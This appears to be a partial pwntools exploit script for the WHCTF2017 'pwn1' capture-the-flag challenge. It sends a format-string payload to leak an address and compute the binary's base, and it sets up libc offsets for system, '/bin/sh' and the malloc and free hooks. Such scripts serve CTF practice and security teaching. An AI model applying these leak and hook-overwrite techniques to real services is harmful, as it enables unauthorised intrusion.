#coding:utf-8
from pwn import *
#modify local or remote
local=True
if local:
    p=process("./pwn1")
    # p=process("./pwn1",env={"LD_PRELOAD":"./libc"})
else:
    p=remote("118.31.10.225", 20001)

# setting for gdb terminal
# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(proc.pidof(p)[0])

# context(arch = 'i386', os = 'linux')
# context(arch ='amd64', os = 'linux')
# context.log_level='DEBUG'
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
# shellcode=asm(shellcraft.sh())

r=lambda x: p.recv(x)
ru=lambda x: p.recvuntil(x)
rud=lambda x:p.recvuntil(x,drop="true")
se=lambda x: p.send(x)
sel=lambda x: p.sendline(x)
pick32=lambda x: u32(x[:4].ljust(4,'\0'))
pick64=lambda x: u64(x[:8].ljust(8,'\0'))

libc_local64={
    'base':0x0,
    '__libc_start_main': 0x209d0,
    'system': 0x044380,
    '__free_hook': 0x3c69a8,
    '__malloc_hook': 0x3c4bd0,
    'binsh':0x0018c385,
    'leaked': 0x20ac0,
}

libc_local32={
    'base':0x0,
    'system': 0x0003b340,
    'binsh':0x0015f803,
    'puts': 0x62b30,
}

libc_remote={
    'base':0x0,
    'leaked':0x0
}


elf={
    'base':0x0,
    'leaked':0xda0,
    'free_got':0x202018,
}

if local:
    libc=libc_local64
else:
    libc=libc_remote

def set_base(mod,ref,addr):
    base=addr-mod[ref]
    for element in mod:
        mod[element] += base





# code base
ru(":")
sel("1")
ru("WHCTF2017:")
pay="a"*(0x3e8)+"%s|%396$p\0"
sel(pay)
ru("|%396$p|")
leaked=int(rud('|\n'),16)
print "[*]leaked is @%#x" %leaked
set_base(elf,'leaked',leaked)
print "[*]elfbase is @%#x" %elf['base']



# gdb.attach(p,'''
#     b*0x555555554C05
#     b*0x555555554C20
#     c
# ''')






p.interactive()
